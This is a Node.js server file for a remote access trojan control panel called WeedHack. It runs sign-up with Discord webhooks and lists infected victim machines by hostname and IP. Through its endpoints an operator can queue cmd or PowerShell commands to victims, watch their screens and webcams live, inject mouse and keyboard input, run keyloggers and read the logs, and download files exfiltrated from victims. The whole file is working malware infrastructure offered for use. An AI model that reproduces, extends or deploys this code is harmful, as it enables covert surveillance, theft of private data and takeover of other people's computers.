// language: JavaScript, file: server.js, target: Node 22.5+
// weedhack — http :80, https :443, udp :880.

import 'dotenv/config';
import express from 'express';
import helmet from 'helmet';
import cookieParser from 'cookie-parser';
import rateLimit from 'express-rate-limit';
import bcrypt from 'bcryptjs';
import jwt from 'jsonwebtoken';
import crypto from 'node:crypto';
import fs from 'node:fs';
import http from 'node:http';
import https from 'node:https';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import db, { UPLOAD_DIR } from './db.js';
import { startUdp, sendInput, sendCfg, getFrame, getWebcamFrame, getMonitors } from './net.js';
import { handleRpc } from './tcp_rpc.js';

const __dirname  = path.dirname(fileURLToPath(import.meta.url));
const PUBLIC_DIR = path.join(__dirname, 'public');

const CFG = {
  httpPort:   Number(process.env.HTTP_PORT || 80),
  tcpPort:    Number(process.env.TCP_PORT  || 443),
  udpPort:    Number(process.env.UDP_PORT  || 880),
  bindHost:   process.env.BIND_HOST || '0.0.0.0',
  tlsCert:    process.env.TLS_CERT || '',
  tlsKey:     process.env.TLS_KEY  || '',
  jwtSecret:  process.env.JWT_SECRET || 'dev_only_change_me',
  cookieSecure: process.env.COOKIE_SECURE === 'true',
  maxUpload:  Number(process.env.MAX_UPLOAD_BYTES || 64 * 1024 * 1024),
};

if (!fs.existsSync(path.join(PUBLIC_DIR, 'css', 'style.css'))) {
  console.error(`[startup] FATAL: ${PUBLIC_DIR}/css/style.css missing.`);
  process.exit(1);
}
if (!fs.existsSync(CFG.tlsCert) || !fs.existsSync(CFG.tlsKey)) {
  console.error(`[startup] FATAL: TLS cert/key missing.`);
  console.error(`  cert: ${CFG.tlsCert}`);
  console.error(`  key : ${CFG.tlsKey}`);
  process.exit(1);
}

const tlsOpts = {
  cert: fs.readFileSync(CFG.tlsCert),
  key:  fs.readFileSync(CFG.tlsKey),
};

const app = express();
app.disable('x-powered-by');
app.set('trust proxy', false);

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc:  ["'self'"],
      styleSrc:   ["'self'", "'unsafe-inline'"],
      imgSrc:     ["'self'", 'data:'],
      connectSrc: ["'self'"],
      frameAncestors: ["'none'"],
      objectSrc:  ["'none'"],
      baseUri:    ["'self'"],
      upgradeInsecureRequests: null,
    },
  },
  hsts: false,
  crossOriginResourcePolicy: { policy: 'same-origin' },
  referrerPolicy: { policy: 'no-referrer' },
}));
app.use(cookieParser());

app.use((req, res, next) => {
  const t = Date.now();
  res.on('finish', () => {
    const skip = req.path.includes('/screen') || req.path.endsWith('/webcam');
    if (!skip) console.log(`[http] ${req.method} ${req.url} ${req.ip} -> ${res.statusCode} (${Date.now() - t}ms)`);
  });
  next();
});

app.post('/api/rpc',
  express.json({ limit: Math.ceil(CFG.maxUpload * 1.5) }),
  (req, res) => {
    try { res.json(handleRpc(req.body, req.ip)); }
    catch (e) { console.error('[rpc]', e); res.status(500).json({ error: 'rpc error' }); }
  }
);

app.use('/api/client/upload', express.raw({
  type: ['application/zip', 'application/octet-stream'],
  limit: CFG.maxUpload,
}));

app.use(express.json({ limit: '256kb' }));

const limit = (opts) => rateLimit({ standardHeaders: true, legacyHeaders: false, ...opts });
const limitGlobal = limit({
  windowMs: 60_000, max: 600,
  message: { error: 'too many requests' },
  skip: (req) =>
    req.path.endsWith('/screen') ||
    req.path.endsWith('/input') ||
    req.path.endsWith('/monitors') ||
    req.path.endsWith('/webcam') ||
    req.path.endsWith('/rdp/update') ||
    req.path.endsWith('/rdp/stop') ||
    req.path.endsWith('/webcam/stop') ||
    req.path.endsWith('/keylog/stop'),
});
const limitAuth     = limit({ windowMs: 15 * 60_000, max: 20,  message: { error: 'too many attempts, slow down' } });
const limitWebhook  = limit({ windowMs: 60 * 60_000, max: 5,   message: { error: 'webhook test limit reached' } });
const limitDownload = limit({ windowMs: 60_000,      max: 60,  message: { error: 'too many downloads' } });
app.use(limitGlobal);

const sql = (strings, ...vals) => {
  if (vals.length) throw new Error('sql tagged template refused — use ? params');
  return strings[0];
};

const ALPHA = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
function genBlock4() {
  return Array.from({ length: 4 }, () => ALPHA[crypto.randomInt(ALPHA.length)]).join('');
}
function genKey()      { return [genBlock4(), genBlock4(), genBlock4(), genBlock4()].join('-'); }
function genLoginTok() { return [genBlock4(), genBlock4(), genBlock4(), genBlock4()].join('-'); }

const signToken  = (u) => jwt.sign({ uid: u.id, username: u.username }, CFG.jwtSecret, { expiresIn: '7d' });
const cookieOpts = () => ({ httpOnly: true, sameSite: 'lax', secure: CFG.cookieSecure, maxAge: 7 * 24 * 3600 * 1000 });

function requireAuth(req, res, next) {
  const token = req.cookies?.token;
  if (!token) return res.status(401).json({ error: 'unauthorized' });
  try { req.user = jwt.verify(token, CFG.jwtSecret); next(); }
  catch { return res.status(401).json({ error: 'unauthorized' }); }
}

const isDiscordWebhook = (url) => typeof url === 'string' &&
  /^https:\/\/(discord|discordapp)\.com\/api\/webhooks\/\d+\/[\w-]+$/.test(url);

async function sendWebhook(url, payload) {
  try {
    const r = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username: 'WeedHack', ...payload }),
      redirect: 'error',
      signal: AbortSignal.timeout(5000),
    });
    return r.ok;
  } catch { return false; }
}

const getOwnUser = (uid) => db.prepare(sql`
  SELECT id, username, email, account_key, login_token, discord_webhook, created_at
  FROM users WHERE id = ?
`).get(uid);

app.use(express.static(PUBLIC_DIR, {
  etag: true,
  maxAge: '1h',
  setHeaders: (res, filePath) => {
    if (filePath.endsWith('.html')) res.setHeader('Cache-Control', 'no-store');
  },
}));

app.get('/api/health', (_req, res) => {
  res.json({ ok: true, uptime: Math.round(process.uptime()),
             http: CFG.httpPort, tcp: CFG.tcpPort, udp: CFG.udpPort,
             time: new Date().toISOString() });
});

app.post('/api/signup', limitAuth, async (req, res) => {
  const { username, email, password, discordWebhook } = req.body || {};
  if (!username || !email || !password || !discordWebhook)
    return res.status(400).json({ error: 'all fields required' });
  if (username.length < 3 || username.length > 32)
    return res.status(400).json({ error: 'username 3-32 chars' });
  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email))
    return res.status(400).json({ error: 'invalid email' });
  if (password.length < 8)
    return res.status(400).json({ error: 'password min 8 chars' });
  if (!isDiscordWebhook(discordWebhook))
    return res.status(400).json({ error: 'invalid discord webhook url' });

  const exists = db.prepare(sql`SELECT id FROM users WHERE username = ? OR email = ?`).get(username, email);
  if (exists) return res.status(409).json({ error: 'username or email taken' });

  const webhookOk = await sendWebhook(discordWebhook, {
    content: `webhook verified for \`${username}\``,
    embeds: [{ title: 'account verified', color: 0x28C258,
               description: 'your webhook is live. your keys arrive next.',
               timestamp: new Date().toISOString() }],
  });
  if (!webhookOk) return res.status(400).json({ error: 'webhook unreachable — check the url' });

  const hash       = await bcrypt.hash(password, 12);
  const accountKey = genKey();
  const loginToken = genLoginTok();

  const info = db.prepare(sql`
    INSERT INTO users (username, email, password_hash, account_key, login_token, discord_webhook, created_at)
    VALUES (?, ?, ?, ?, ?, ?, ?)
  `).run(username, email, hash, accountKey, loginToken, discordWebhook, Date.now());

  const user = { id: Number(info.lastInsertRowid), username };

  sendWebhook(discordWebhook, {
    content: `keys for **${username}**`,
    embeds: [{
      title: 'your keys',
      color: 0x1F8A3B,
      description:
        `**account key** (client auth)\n\`\`\`\n${accountKey}\n\`\`\`\n` +
        `**login token** (dashboard sign-in)\n\`\`\`\n${loginToken}\n\`\`\``,
      timestamp: new Date().toISOString(),
    }],
  });

  res.cookie('token', signToken(user), cookieOpts());
  res.json({ ok: true, accountKey, loginToken, username });
});

app.post('/api/signin', limitAuth, async (req, res) => {
  const { username, loginToken, password } = req.body || {};
  if (!password) return res.status(400).json({ error: 'missing password' });
  if (!username && !loginToken) return res.status(400).json({ error: 'missing username or token' });

  const user = loginToken
    ? db.prepare(sql`SELECT * FROM users WHERE login_token = ?`).get(loginToken)
    : db.prepare(sql`SELECT * FROM users WHERE username = ? OR email = ?`).get(username, username);

  if (!user) return res.status(401).json({ error: 'invalid credentials' });
  const ok = await bcrypt.compare(password, user.password_hash);
  if (!ok) return res.status(401).json({ error: 'invalid credentials' });

  res.cookie('token', signToken({ id: user.id, username: user.username }), cookieOpts());
  res.json({ ok: true, username: user.username });
});

app.post('/api/logout', (_req, res) => { res.clearCookie('token'); res.json({ ok: true }); });

app.get('/api/me', requireAuth, (req, res) => {
  const row = getOwnUser(req.user.uid);
  if (!row) return res.status(404).json({ error: 'not found' });
  res.json({
    username: row.username,
    email: row.email,
    accountKey: row.account_key,
    loginToken: row.login_token,
    discordWebhook: row.discord_webhook,
    createdAt: row.created_at,
  });
});

app.post('/api/webhook/test', requireAuth, limitWebhook, async (req, res) => {
  const { url } = req.body || {};
  if (!isDiscordWebhook(url)) return res.status(400).json({ error: 'invalid discord webhook url' });
  const ok = await sendWebhook(url, {
    content: 'webhook test',
    embeds: [{ title: 'connection live', color: 0x28C258, timestamp: new Date().toISOString() }],
  });
  if (!ok) return res.status(502).json({ error: 'webhook unreachable' });
  db.prepare(sql`UPDATE users SET discord_webhook = ? WHERE id = ?`).run(url, req.user.uid);
  res.json({ ok: true });
});

app.get('/api/clients', requireAuth, (req, res) => {
  const status = String(req.query.status || 'all').toLowerCase();
  const q      = String(req.query.q || '').trim();
  const limitN = Math.min(Math.max(Number(req.query.limit  || 50),  1), 200);
  const offset = Math.max(Number(req.query.offset || 0), 0);
  const now    = Date.now();
  const cutoff = now - 30_000;

  const filters = ['user_id = ?'];
  const params  = [req.user.uid];

  if (status === 'online')  { filters.push('last_seen >= ?'); params.push(cutoff); }
  if (status === 'offline') { filters.push('last_seen < ?');  params.push(cutoff); }
  if (q) {
    filters.push('(hostname LIKE ? OR ip LIKE ?)');
    params.push(`%${q}%`, `%${q}%`);
  }
  const where = filters.join(' AND ');

  const totalRow = db.prepare(`SELECT COUNT(*) AS n FROM clients WHERE ${where}`).get(...params);
  const rows = db.prepare(`
    SELECT id, hostname, ip, last_seen FROM clients
    WHERE ${where}
    ORDER BY last_seen DESC
    LIMIT ? OFFSET ?
  `).all(...params, limitN, offset);

  const onlineRow = db.prepare(`SELECT COUNT(*) AS n FROM clients WHERE user_id = ? AND last_seen >= ?`)
    .get(req.user.uid, cutoff);
  const offlineRow = db.prepare(`SELECT COUNT(*) AS n FROM clients WHERE user_id = ? AND last_seen < ?`)
    .get(req.user.uid, cutoff);

  res.json({
    total:   Number(totalRow.n),
    online:  Number(onlineRow.n),
    offline: Number(offlineRow.n),
    rows: rows.map(r => ({
      id: r.id,
      hostname: r.hostname,
      ip: r.ip,
      online: now - r.last_seen < 30_000,
      lastSeen: r.last_seen,
    })),
  });
});

app.get('/api/clients/:id/uploads', requireAuth, (req, res) => {
  const clientId = Number(req.params.id);
  const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(clientId, req.user.uid);
  if (!client) return res.status(404).json({ error: 'client not found' });
  const rows = db.prepare(sql`
    SELECT id, filename, size, created_at FROM uploads
    WHERE user_id = ? AND client_id = ?
    ORDER BY created_at DESC LIMIT 200
  `).all(req.user.uid, clientId);
  res.json(rows);
});

app.get('/api/uploads/:id/download', limitDownload, requireAuth, (req, res) => {
  const uploadId = Number(req.params.id);
  const row = db.prepare(sql`
    SELECT filename, stored_name, size FROM uploads
    WHERE id = ? AND user_id = ?
  `).get(uploadId, req.user.uid);
  if (!row) return res.status(404).json({ error: 'not found' });
  const src = path.join(UPLOAD_DIR, row.stored_name);
  if (!fs.existsSync(src)) return res.status(410).json({ error: 'file gone' });
  res.setHeader('Content-Type', 'application/zip');
  res.setHeader('Content-Length', row.size);
  res.setHeader('Content-Disposition', `attachment; filename="${row.filename.replace(/"/g, '')}"`);
  fs.createReadStream(src).pipe(res);
});

app.post('/api/clients/:id/exec', requireAuth, (req, res) => {
  const clientId = Number(req.params.id);
  const { shell, line } = req.body || {};
  if (!['cmd', 'powershell'].includes(shell)) return res.status(400).json({ error: 'bad shell' });
  if (typeof line !== 'string' || !line.trim() || line.length > 4096)
    return res.status(400).json({ error: 'bad line' });

  const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(clientId, req.user.uid);
  if (!client) return res.status(404).json({ error: 'client not found' });

  const info = db.prepare(sql`
    INSERT INTO commands (user_id, client_id, shell, line, status, created_at)
    VALUES (?, ?, ?, ?, 'pending', ?)
  `).run(req.user.uid, clientId, shell, line, Date.now());

  console.log(`[exec] queued cmd ${info.lastInsertRowid} to client ${clientId}: ${shell} ${line}`);
  res.json({ ok: true, commandId: Number(info.lastInsertRowid) });
});

app.get('/api/clients/:id/commands', requireAuth, (req, res) => {
  const clientId = Number(req.params.id);
  const rows = db.prepare(sql`
    SELECT id, shell, line, output, status, created_at FROM commands
    WHERE user_id = ? AND client_id = ?
    ORDER BY created_at DESC LIMIT 100
  `).all(req.user.uid, clientId);
  res.json(rows);
});

app.delete('/api/clients/:id', requireAuth, (req, res) => {
  const clientId = Number(req.params.id);
  const info = db.prepare(sql`DELETE FROM clients WHERE id = ? AND user_id = ?`).run(clientId, req.user.uid);
  if (info.changes === 0) return res.status(404).json({ error: 'not found' });
  res.json({ ok: true });
});

app.post('/api/clients/:id/rdp/start', requireAuth, (req, res) => {
  const cid = Number(req.params.id);
  const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
  if (!client) return res.status(404).json({ error: 'client not found' });

  const cfg = {
    monitor:  Number(req.body.monitor  || 0),
    width:    Math.min(Math.max(Number(req.body.width  || 1280), 320), 3840),
    height:   Math.min(Math.max(Number(req.body.height || 720),  240), 2160),
    quality:  Math.min(Math.max(Number(req.body.quality || 50),   10),  90),
    fps:      Math.min(Math.max(Number(req.body.fps     || 10),    1),  30),
    keyboard: req.body.keyboard === true,
    mouse:    req.body.mouse === true,
  };

  const info = db.prepare(sql`
    INSERT INTO commands (user_id, client_id, shell, line, status, created_at)
    VALUES (?, ?, 'rdp', ?, 'pending', ?)
  `).run(req.user.uid, cid, JSON.stringify(cfg), Date.now());

  console.log(`[rdp] start queued to client ${cid}`);
  res.json({ ok: true });
});

app.post('/api/clients/:id/rdp/stop', requireAuth, (req, res) => {
  const cid = Number(req.params.id);
  const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
  if (!client) return res.status(404).json({ error: 'client not found' });

  db.prepare(sql`
    INSERT INTO commands (user_id, client_id, shell, line, status, created_at)
    VALUES (?, ?, 'rdp', '{"stop":true}', 'pending', ?)
  `).run(req.user.uid, cid, Date.now());

  res.json({ ok: true });
});

app.post('/api/clients/:id/rdp/update', requireAuth, (req, res) => {
  const cid = Number(req.params.id);
  const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
  if (!client) return res.status(404).json({ error: 'client not found' });
  const ok = sendCfg(cid, JSON.stringify(req.body || {}));
  res.json({ ok });
});

app.get('/api/clients/:id/screen', requireAuth, (req, res) => {
  const cid = Number(req.params.id);
  const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
  if (!client) return res.status(404).json({ error: 'client not found' });
  const jpeg = getFrame(cid);
  if (!jpeg) return res.status(204).end();
  res.setHeader('Content-Type', 'image/jpeg');
  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate');
  res.setHeader('Pragma', 'no-cache');
  res.send(jpeg);
});

app.get('/api/clients/:id/monitors', requireAuth, (req, res) => {
  const cid = Number(req.params.id);
  const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
  if (!client) return res.status(404).json({ error: 'client not found' });
  res.json(getMonitors(cid));
});

app.post('/api/clients/:id/input', requireAuth, (req, res) => {
  const cid = Number(req.params.id);
  const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
  if (!client) return res.status(404).json({ error: 'client not found' });
  const ok = sendInput(cid, JSON.stringify(req.body || {}));
  res.json({ ok });
});

app.post('/api/clients/:id/webcam/start', requireAuth, (req, res) => {
  const cid = Number(req.params.id);
  const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
  if (!client) return res.status(404).json({ error: 'client not found' });

  const cfg = {
    camera:  Number(req.body.camera  || 0),
    width:   Math.min(Math.max(Number(req.body.width  || 640), 160), 1920),
    height:  Math.min(Math.max(Number(req.body.height || 480), 120), 1080),
    quality: Math.min(Math.max(Number(req.body.quality || 55),  10),  90),
    fps:     Math.min(Math.max(Number(req.body.fps     || 10),   1),  30),
  };

  db.prepare(sql`
    INSERT INTO commands (user_id, client_id, shell, line, status, created_at)
    VALUES (?, ?, 'webcam', ?, 'pending', ?)
  `).run(req.user.uid, cid, JSON.stringify(cfg), Date.now());

  console.log(`[webcam] start queued to client ${cid}`);
  res.json({ ok: true });
});

app.post('/api/clients/:id/webcam/stop', requireAuth, (req, res) => {
  const cid = Number(req.params.id);
  const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
  if (!client) return res.status(404).json({ error: 'client not found' });
  db.prepare(sql`
    INSERT INTO commands (user_id, client_id, shell, line, status, created_at)
    VALUES (?, ?, 'webcam', '{"stop":true}', 'pending', ?)
  `).run(req.user.uid, cid, Date.now());
  res.json({ ok: true });
});

app.get('/api/clients/:id/webcam', requireAuth, (req, res) => {
  const cid = Number(req.params.id);
  const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
  if (!client) return res.status(404).json({ error: 'client not found' });
  const jpeg = getWebcamFrame(cid);
  if (!jpeg) return res.status(204).end();
  res.setHeader('Content-Type', 'image/jpeg');
  res.setHeader('Cache-Control', 'no-store');
  res.send(jpeg);
});

app.post('/api/clients/:id/keylog/start', requireAuth, (req, res) => {
  const cid = Number(req.params.id);
  const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
  if (!client) return res.status(404).json({ error: 'client not found' });
  db.prepare(sql`
    INSERT INTO commands (user_id, client_id, shell, line, status, created_at)
    VALUES (?, ?, 'keylog', '{"start":true}', 'pending', ?)
  `).run(req.user.uid, cid, Date.now());
  res.json({ ok: true });
});

app.post('/api/clients/:id/keylog/stop', requireAuth, (req, res) => {
  const cid = Number(req.params.id);
  const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
  if (!client) return res.status(404).json({ error: 'client not found' });
  db.prepare(sql`
    INSERT INTO commands (user_id, client_id, shell, line, status, created_at)
    VALUES (?, ?, 'keylog', '{"stop":true}', 'pending', ?)
  `).run(req.user.uid, cid, Date.now());
  res.json({ ok: true });
});

app.get('/api/clients/:id/keylog', requireAuth, (req, res) => {
  const cid = Number(req.params.id);
  const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
  if (!client) return res.status(404).json({ error: 'client not found' });
  const rows = db.prepare(sql`
    SELECT id, data, created_at FROM keylogs
    WHERE user_id = ? AND client_id = ?
    ORDER BY created_at DESC LIMIT 500
  `).all(req.user.uid, cid);
  res.json(rows.reverse());
});

app.delete('/api/clients/:id/keylog', requireAuth, (req, res) => {
  const cid = Number(req.params.id);
  const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
  if (!client) return res.status(404).json({ error: 'client not found' });
  db.prepare(sql`DELETE FROM keylogs WHERE user_id = ? AND client_id = ?`).run(req.user.uid, cid);
  res.json({ ok: true });
});

app.use('/api', (_req, res) => res.status(404).json({ error: 'not found' }));
app.use((err, _req, res, _next) => { console.error('[http]', err); res.status(500).json({ error: 'server error' }); });

const udpSock = startUdp({
  host: CFG.bindHost, port: CFG.udpPort,
  onMsg: (text, rinfo, s) => {
    s.send(Buffer.from(`weedhack: ${text}`), rinfo.port, rinfo.address, () => {});
  },
});

const httpServer = http.createServer(app);
httpServer.listen(CFG.httpPort, CFG.bindHost, () => {
  console.log(`[startup] cwd = ${process.cwd()}`);
  console.log(`[startup] public = ${PUBLIC_DIR}`);
  console.log(`WeedHack http  on ${CFG.bindHost}:${CFG.httpPort}`);
});

const tlsHttpServer = https.createServer(tlsOpts, app);
tlsHttpServer.on('tlsClientError', (e) => console.log(`[tls] client err: ${e.message}`));
tlsHttpServer.listen(CFG.tcpPort, CFG.bindHost, () => {
  console.log(`WeedHack https on ${CFG.bindHost}:${CFG.tcpPort}`);
  console.log(`WeedHack udp   on ${CFG.bindHost}:${CFG.udpPort}`);
});

let shuttingDown = false;
function shutdown(sig) {
  if (shuttingDown) return;
  shuttingDown = true;
  console.log(`\n[shutdown] ${sig}`);
  httpServer.close(() => console.log('[shutdown] http closed'));
  tlsHttpServer.close(() => console.log('[shutdown] https closed'));
  try { udpSock.close(() => console.log('[shutdown] udp closed')); } catch {}
  setTimeout(() => process.exit(0), 3000).unref();
}
process.on('SIGINT',  () => shutdown('SIGINT'));
process.on('SIGTERM', () => shutdown('SIGTERM'));
process.on('uncaughtException',  (e) => console.error('[uncaught]', e));
process.on('unhandledRejection', (e) => console.error('[unhandled]', e));